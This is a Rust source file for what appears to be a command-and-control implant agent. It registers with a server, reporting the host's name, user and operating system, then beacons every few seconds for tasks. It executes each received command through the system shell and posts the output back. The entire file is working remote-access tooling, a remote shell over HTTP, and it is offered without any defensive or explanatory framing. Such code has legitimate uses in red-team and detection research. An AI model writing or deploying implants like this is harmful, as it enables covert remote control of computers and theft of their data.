use serde::{Deserialize, Serialize};
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

const DEFAULT_SERVER: &str = "http://127.0.0.1:8080";
const POLL_SECS: u64 = 3;

#[derive(Serialize)]
struct RegisterReq {
    id: String,
    hostname: String,
    user: String,
    os: String,
}

#[derive(Deserialize)]
struct RegisterResp {
    id: String,
}

#[derive(Deserialize)]
struct Task {
    id: u64,
    cmd: String,
}

fn env_or(keys: &[&str], fallback: &str) -> String {
    keys.iter()
        .find_map(|k| std::env::var(k).ok().filter(|v| !v.is_empty()))
        .unwrap_or_else(|| fallback.to_string())
}

fn main() {
    // usage: agent [server_url] [fixed_agent_id]
    let server = std::env::args()
        .nth(1)
        .unwrap_or_else(|| DEFAULT_SERVER.to_string());
    let fixed_id = std::env::args().nth(2).unwrap_or_default();

    let hostname = env_or(&["COMPUTERNAME", "HOSTNAME"], "unknown");
    let user = env_or(&["USERNAME", "USER"], "unknown");
    let os = std::env::consts::OS.to_string();

    let agent_id = loop {
        match register(&server, &fixed_id, &hostname, &user, &os) {
            Some(id) => break id,
            None => {
                eprintln!("[-] could not reach {server}, retrying in 5s");
                sleep(Duration::from_secs(5));
            }
        }
    };
    println!("[+] registered as agent {agent_id}");
    println!("[*] beaconing to {server} every {POLL_SECS}s");

    loop {
        match poll_task(&server, &agent_id) {
            Some(task) => {
                println!("[*] got task {}: {}", task.id, task.cmd);
                if task.cmd.trim() == "exit" {
                    send_result(&server, &agent_id, task.id, "agent exiting".into(), true);
                    println!("[+] exit received, shutting down");
                    break;
                }
                let (output, success) = run_cmd(&task.cmd);
                send_result(&server, &agent_id, task.id, output, success);
            }
            None => sleep(Duration::from_secs(POLL_SECS)),
        }
    }
}

fn register(server: &str, id: &str, hostname: &str, user: &str, os: &str) -> Option<String> {
    let body = RegisterReq {
        id: id.to_string(),
        hostname: hostname.to_string(),
        user: user.to_string(),
        os: os.to_string(),
    };
    let resp = ureq::post(&format!("{server}/api/register"))
        .send_json(body)
        .ok()?;
    resp.into_json::<RegisterResp>().ok().map(|r| r.id)
}

fn poll_task(server: &str, agent_id: &str) -> Option<Task> {
    let resp = ureq::get(&format!("{server}/api/tasks?id={agent_id}"))
        .call()
        .ok()?;
    if resp.status() == 204 {
        return None;
    }
    resp.into_json::<Task>().ok()
}

fn send_result(server: &str, agent_id: &str, task_id: u64, output: String, success: bool) {
    let body = ureq::json!({
        "agent_id": agent_id,
        "task_id": task_id,
        "output": output,
        "success": success,
    });
    if let Err(e) = ureq::post(&format!("{server}/api/results")).send_json(body) {
        eprintln!("[-] failed to send result for task {task_id}: {e}");
    }
}

fn run_cmd(cmd: &str) -> (String, bool) {
    let output = if cfg!(windows) {
        Command::new("cmd").args(["/C", cmd]).output()
    } else {
        Command::new("sh").args(["-c", cmd]).output()
    };
    match output {
        Ok(out) => {
            let mut text = String::from_utf8_lossy(&out.stdout).into_owned();
            text.push_str(&String::from_utf8_lossy(&out.stderr));
            (truncate(text), out.status.success())
        }
        Err(e) => (format!("failed to spawn process: {e}"), false),
    }
}

fn truncate(s: String) -> String {
    const MAX_CHARS: usize = 8 * 1024;
    if s.chars().count() > MAX_CHARS {
        let head: String = s.chars().take(MAX_CHARS).collect();
        return format!("{head}\n...[output truncated]");
    }
    s
}
